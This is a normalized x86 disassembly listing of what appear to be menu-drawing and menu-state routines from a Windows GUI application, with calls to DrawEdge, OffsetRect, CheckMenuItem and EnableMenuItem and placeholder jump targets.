mov [ eax - 0x31 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov al [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_4042a8
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001e
call sub_41fcc0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_420064
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x2
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x8 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x41 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_4421ac
cmp ebx eax
jl r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx eax [ eax + 0x38 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4203c0
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov esi [ eax + 0x4c ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
sub eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41fcb8
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_41fcc0
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_41fcc0
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_420064
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41fcb8
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov edx 0xff000014
mov eax 0xff00000f
call sub_424ba4
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41fc94
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_420064
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
sub eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x20 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
mov ax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x64 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x65 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_420064
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_422ab8
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4c ] eax
xor eax eax
push ebp
push sub_44613b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x7ff8
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_423ba0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff000012
call sub_41f4f4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx - 0xc ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_4421ac
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41fcc0
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_445198
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x5c ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x58 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub eax edx
sar eax 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov dl [ r-xdata ]
call sub_41f7c0
mov eax [ ebp + 0x8 ]
or [ eax - 0x64 ] 0x100000
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4203c0
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4201a0
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x5c ]
lea edi [ edx - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax edx
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] edx
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx esi
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x10 ]
sub edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov al [ eax + 0x39 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_44249c
jmp r-xdata
push eax
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4203c0
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0xc ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
pop ecx
call sub_41ffb8
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
call sub_41f4f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_403164
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_445198
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov bx [ eax + 0x60 ]
test bx bx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4465ff
lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax ebx
call sub_44425c
mov eax [ ebp + 0x8 ]
mov [ eax - 0x20 ] 0xa
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov edx [ ebp - 0x4 ]
call sub_420220
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x20 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
push 0x2
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ ebp - 0x4 ]
call sub_445198
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
sub_44674c
push ebx
xor ebx ebx
mov edx [ eax + 0x64 ]
jmp r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
cmp [ edx + 0x7c ] 0x0
je r-xdata
call sub_447130
test eax eax
je r-xdata
mov ebx [ edx + 0x7c ]
jmp r-xdata
mov edx [ edx + 0x64 ]
mov eax ebx
pop ebx
retn
mov ebx [ eax + 0x48 ]
sub_44677c
push ebp
mov ebp esp
add esp 0xfffffeac
mov [ ebp - 0x154 ] 0x154
push 0x0
lea eax [ ebp - 0x154 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0xbc ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0xb8 ]
mov [ eax ] edx
sub_4467c8
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
mov edi eax
xor eax eax
push ebp
push sub_4469aa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov si 0xfff2
call sub_403360
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
xor ebx ebx
mov bl 0x1
push ebp
call sub_44677c
pop ecx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x5
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xfffffffe
xor eax eax
jmp r-xdata
mov eax edi
call sub_447130
mov esi eax
mov eax edi
call sub_44674c
mov [ ebp - 0xc ] eax
mov eax [ edi + 0x30 ]
mov edx r-xdata
call sub_4042a8
jne r-xdata
cmp [ edi + 0x4c ] 0x0
je r-xdata
cmp [ edi + 0x40 ] 0xffffffff
jg r-xdata
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xfffffff9
xor eax eax
mov eax [ edi + 0x4c ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
test bl bl
jne r-xdata
test bl bl
jne r-xdata
test bl bl
jne r-xdata
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x10
test bl bl
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
lea eax [ ebp - 0x20 ]
xor ecx ecx
mov edx 0x10
call sub_402b78
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax ] 0x3
mov eax [ ebp - 0x4 ]
add [ eax ] 0xf
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x10
mov eax esi
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
xor ebx ebx
mov bl [ esi + 0x60 ]
jmp r-xdata
mov si [ edi + 0x60 ]
test si si
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ edi + 0x30 ]
call sub_403f34
lea edx [ ebp - 0x24 ]
mov eax esi
call sub_44425c
mov ecx [ ebp - 0x24 ]
lea eax [ ebp - 0x10 ]
mov edx [ edi + 0x30 ]
call sub_4041a8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4469b1
lea eax [ ebp - 0x24 ]
call sub_403e9c
lea eax [ ebp - 0x10 ]
call sub_403e9c
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ edi + 0xa4 ]
call [ edi + 0xa0 ]
xor eax eax
mov al bl
mov ax [ eax * 2 + rw-data ]
or ax 0x40
or ax 0x20
or ax 0x100
or ax 0x400
movzx eax ax
lea edx [ ebp - 0x20 ]
push edx
push 0x0
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_445198
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
add eax 0x7
mov edx [ ebp - 0x4 ]
add [ edx ] eax
cmp [ edi + 0xa2 ] 0x0
je r-xdata
sub_4469dc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
mov edx esi
call sub_4042a8
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x30 ]
mov edx esi
call sub_403ef0
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_446a04
push ebx
push esi
push edi
mov ebx eax
mov esi [ ebx + 0x64 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_446b74
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ eax + 0x3d ] 0x0
je r-xdata
mov edx edi
mov eax [ ebx + 0x64 ]
call sub_446b84
cmp ebx eax
je r-xdata
mov dl [ eax + 0x3f ]
cmp dl [ ebx + 0x3f ]
jne r-xdata
xor edx edx
call sub_446a4c
sub_446a4c
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x38 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x38 ] bl
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
test bl bl
je r-xdata
test [ esi + 0x1c ] 0x2
jne r-xdata
cmp [ esi + 0x3d ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x50 ]
push eax
mov eax edi
call sub_445108
push eax
call CheckMenuItem
mov eax esi
call sub_446a04
sub_446aa0
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x39 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x39 ] bl
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
mov eax esi
call sub_446b74
test eax eax
jne r-xdata
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
jmp r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
test [ esi + 0x1c ] 0x2
jne r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x50 ]
push eax
mov eax edi
call sub_445108
push eax
call EnableMenuItem
sub_446b18
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x3f ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
mov [ esi + 0x3f ] bl
cmp [ esi + 0x38 ] 0x0
je r-xdata
mov edx esi
mov eax edi
call sub_446ed8
mov edx eax
mov ecx ebx
mov eax edi
call sub_4450a8
cmp [ esi + 0x3d ] 0x0
je r-xdata
mov eax esi
call sub_446a04
sub_446b84
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_416b18
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_4441b0
sub_446bf4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
call sub_446b74
test esi esi
jge r-xdata
cmp eax esi
jg r-xdata
xor esi esi
mov eax ebx
call sub_446bdc
cmp esi eax
je r-xdata
mov esi eax
dec esi
mov edi [ ebx + 0x64 ]
mov edx ebx
mov eax edi
call sub_446f0c
mov ecx ebx
mov edx esi
mov eax edi
call sub_446d00
sub_446c3c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_446b74
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_446b84
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_446c94
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x3a ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ ebp + 0x3a ] bl
mov dl 0x1
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebp + 0x64 ] 0x0
je r-xdata
mov eax [ ebp + 0x64 ]
call sub_446b74
